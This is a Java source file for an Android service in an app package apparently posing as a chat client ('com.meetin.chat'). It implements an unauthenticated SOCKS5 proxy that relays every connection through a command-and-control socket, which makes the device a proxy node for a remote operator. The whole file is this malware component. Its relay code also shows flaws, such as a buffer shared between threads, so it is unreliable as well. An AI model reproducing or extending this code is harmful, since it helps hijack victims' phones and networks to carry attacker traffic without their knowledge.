package com.meetin.chat;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import java.io.*;
import java.net.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class ProxyService extends Service {
    private static final String TAG = "ProxyService";
    private static final int PROXY_PORT = 1080;
    private ServerSocket serverSocket;
    private ExecutorService executor;
    private volatile boolean running = false;
    private Socket c2Socket;

    @Override
    public void onCreate() {
        super.onCreate();
        executor = Executors.newCachedThreadPool();
        Log.d(TAG, "ProxyService created");
    }

    public void setC2Socket(Socket socket) {
        this.c2Socket = socket;
        Log.d(TAG, "C2 socket set");
    }

    public void startProxy() {
        if (running) return;
        running = true;
        executor.submit(this::proxyLoop);
        Log.d(TAG, "SOCKS5 proxy started on port " + PROXY_PORT);
    }

    public void stopProxy() {
        running = false;
        try {
            if (serverSocket != null) serverSocket.close();
        } catch (Exception e) {
            Log.e(TAG, "Error stopping proxy: " + e.getMessage());
        }
        Log.d(TAG, "SOCKS5 proxy stopped");
    }

    public boolean isRunning() {
        return running;
    }

    private void proxyLoop() {
        try {
            serverSocket = new ServerSocket(PROXY_PORT);
            Log.d(TAG, "SOCKS5 proxy listening on port " + PROXY_PORT);
            while (running) {
                try {
                    Socket client = serverSocket.accept();
                    executor.submit(() -> handleProxy(client));
                } catch (SocketException e) {
                    if (!running) break;
                }
            }
        } catch (IOException e) {
            Log.e(TAG, "Proxy server error: " + e.getMessage());
        }
    }

    private void handleProxy(Socket client) {
        try {
            InputStream in = client.getInputStream();
            OutputStream out = client.getOutputStream();
            byte[] buffer = new byte[1024];

            // SOCKS5 handshake
            int len = in.read(buffer);
            if (len < 1 || buffer[0] != 0x05) {
                client.close();
                return;
            }

            // No authentication
            out.write(new byte[]{0x05, 0x00});
            out.flush();

            // SOCKS5 request
            len = in.read(buffer);
            if (len < 8) {
                client.close();
                return;
            }

            int cmd = buffer[1];
            if (cmd != 0x01) {
                client.close();
                return;
            }

            // Parse destination
            String host;
            int port;
            int addrType = buffer[3];

            if (addrType == 0x01) {
                host = String.format("%d.%d.%d.%d",
                        buffer[4] & 0xFF, buffer[5] & 0xFF,
                        buffer[6] & 0xFF, buffer[7] & 0xFF);
                port = ((buffer[8] & 0xFF) << 8) | (buffer[9] & 0xFF);
            } else if (addrType == 0x03) {
                int nameLen = buffer[4] & 0xFF;
                host = new String(buffer, 5, nameLen);
                port = ((buffer[5 + nameLen] & 0xFF) << 8) | (buffer[6 + nameLen] & 0xFF);
            } else {
                client.close();
                return;
            }

            Log.d(TAG, "SOCKS5: " + host + ":" + port);

            // --- ROUTE THROUGH C2 SOCKET ---
            PrintWriter c2Writer = new PrintWriter(c2Socket.getOutputStream(), true);
            BufferedReader c2Reader = new BufferedReader(
                new InputStreamReader(c2Socket.getInputStream())
            );

            // Send PROXY command through C2
            c2Writer.println("PROXY " + host + " " + port);

            // Wait for CONNECTED response
            String response = c2Reader.readLine();
            if (response == null || !response.equals("CONNECTED")) {
                client.close();
                return;
            }

            // Send SOCKS5 success
            byte[] success = new byte[10];
            success[0] = 0x05;
            success[1] = 0x00;
            success[2] = 0x00;
            success[3] = 0x01;
            out.write(success);
            out.flush();

            // Relay data through C2 socket
            relayData(client);

        } catch (Exception e) {
            Log.e(TAG, "Proxy error: " + e.getMessage());
        }
    }

    private void relayData(Socket client) {
        try {
            InputStream clientIn = client.getInputStream();
            OutputStream clientOut = client.getOutputStream();
            InputStream c2In = c2Socket.getInputStream();
            OutputStream c2Out = c2Socket.getOutputStream();

            byte[] buffer = new byte[8192];
            boolean[] closed = {false};

            // Client -> C2
            Thread t1 = new Thread(() -> {
                try {
                    int len;
                    while ((len = clientIn.read(buffer)) != -1) {
                        c2Out.write(buffer, 0, len);
                        c2Out.flush();
                    }
                } catch (Exception e) {}
                closed[0] = true;
            });

            // C2 -> Client
            Thread t2 = new Thread(() -> {
                try {
                    int len;
                    while ((len = c2In.read(buffer)) != -1) {
                        clientOut.write(buffer, 0, len);
                        clientOut.flush();
                    }
                } catch (Exception e) {}
                closed[0] = true;
            });

            t1.start();
            t2.start();

            while (!closed[0]) {
                Thread.sleep(100);
            }

            try { client.close(); } catch (Exception e) {}

        } catch (Exception e) {
            Log.e(TAG, "Relay error: " + e.getMessage());
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        stopProxy();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
